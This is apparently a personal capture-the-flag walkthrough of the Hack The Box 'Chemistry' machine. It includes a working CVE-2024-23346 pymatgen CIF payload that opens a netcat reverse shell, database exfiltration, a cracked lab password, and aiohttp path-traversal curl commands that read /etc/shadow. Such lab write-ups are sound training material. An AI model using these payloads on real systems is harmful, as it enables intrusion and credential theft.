# Hack The Box: Chemistry - Comprehensive Notes

**Target IP:** 10.129.239.200 (Dynamic)

## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Ports Open:**

- `22/tcp` - SSH (OpenSSH)
    
- `5000/tcp` - HTTP (UPnP/Werkzeug)
    

**Scan Results:**

```
sudo nmap -p 22,5000 -sC 10.129.213.117 --stats-every 5
# PORT     STATE SERVICE
# 22/tcp   open  ssh
# 5000/tcp open  upnp
```

**Service Enumeration (Port 5000):**

- **Server Header:** Werkzeug 3.0.3 / Python 3.9.5
    
- **Application:** "Chemistry CIF Analyzer"
    
- **Functionality:** Allows users to upload CIF (Crystallographic Information File) files for structural analysis.
    

### Web Enumeration (Gobuster)

Directory brute-forcing revealed standard authentication endpoints and a dashboard.

```
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u [http://10.129.213.117:5000](http://10.129.213.117:5000) -b 403,404
# /login                (Status: 200)
# /register             (Status: 200)
# /upload               (Status: 405)
# /logout               (Status: 302)
# /dashboard            (Status: 302)
```

## 2. Vulnerability Assessment

### Application Analysis

The application accepts `.cif` files. When uploaded, the server processes the file to generate lattice parameters and atomic site tables.

- **Observed Behavior:** Uploading a valid `example.cif` results in the file being parsed and data displayed at a unique URL (e.g., `/structure/<uuid>`).
    
- **Constraint:** The upload filter rejects standard web shells (PHP, JSP).
    

### Research & CVE Discovery

Research into the file format and underlying libraries revealed a critical vulnerability in the **Pymatgen** library used by the backend to parse these files.

- **Vulnerability:** **CVE-2024-23346**
    
- **Description:** A critical flaw in `pymatgen` allows for arbitrary code execution via the `eval()` function when parsing malicious CIF files.
    
- **References:**
    
    - [Github Advisory](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f "null")
        
    - [Vicarius Analysis](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346 "null")
        

_(Note: Initial research also pointed to potential ASUS Router vulnerabilities due to the "RT-AC66U" fingerprint, but this appears to be a red herring or result of the specific Python stack masquerading as UPnP devices.)_

## 3. Exploitation (User Flag)

### Exploit Strategy (CVE-2024-23346)

To exploit the vulnerability, we inject Python code into the `_space_group_magn.transform_BNS_Pp_abc` field of a CIF file. This injection breaks out of the sandbox and executes system commands.

### Payload Construction

We created a malicious file `exploit.cif` containing a reverse shell payload:

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.189 9001 -e sh");0,0,0'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

### Execution

1. Start a listener: `nc -lvnp 9001`
    
2. Register an account on the target web app.
    
3. Upload `exploit.cif`.
    
4. Click "View" or allow the parser to run.
    
5. **Result:** Reverse shell caught as `app` user.
    

## 4. Post-Exploitation & Lateral Movement

### Database Enumeration

Inside the shell, we located the application database:

- **Path:** `/home/app/instance/database.db`
    

Exfiltration:

To extract the data, we moved the database to the web root and downloaded it via the browser:

```
mv /home/app/instance/database.db /home/app/static/database.db
# Download from: [http://10.129.239.200:5000/static/database.db](http://10.129.239.200:5000/static/database.db)
```

### Credential Cracking

Analyzing `database.db` (using `strings` or `sqlite3`) revealed a user hash.

- **User:** `rosa`
    
- **Hash Type:** MD5 (Identified via format)
    
- **Cracking:** Using CrackStation.
    
- **Password Found:** `unicorniosrosados`
    

### SSH Access

Using the cracked credentials, we successfully logged in via SSH:

ssh rosa@10.129.239.200

## 5. Privilege Escalation (Root Flag)

### Internal Enumeration

Checking for internal listening ports revealed a hidden service:

```
ss -tulpn
# Discovery: Port 8080 running on 127.0.0.1
```

### Vulnerability Analysis (aiohttp)

Running **Linpeas** identified a vulnerable version of `aiohttp`:

- **Vulnerability:** **CVE-2024-23334** (aiohttp directory traversal).
    
- **Target:** The service running on port 8080.
    

### Exploitation (CVE-2024-23334)

This CVE allows unauthenticated attackers to access arbitrary files on the server if the application serves static files with `follow_symlinks=True`.

Exploit Method:

We can construct a curl request or Python script to traverse the directory structure and read sensitive files.

**Retrieving Root Flag:**

```
# Direct traversal to the flag
curl -v "[http://127.0.0.1:8080/static/../../../../root/root.txt](http://127.0.0.1:8080/static/../../../../root/root.txt)"
```

Alternative (Cracking Root):

We can also steal the shadow file to crack the root password:

```
curl -v "[http://127.0.0.1:8080/static/../../../../etc/shadow](http://127.0.0.1:8080/static/../../../../etc/shadow)"
curl -v "[http://127.0.0.1:8080/static/../../../../etc/passwd](http://127.0.0.1:8080/static/../../../../etc/passwd)"
```

_(Combine files using `unshadow` and crack with John the Ripper/Hashcat)._

**Status:** Machine Completed.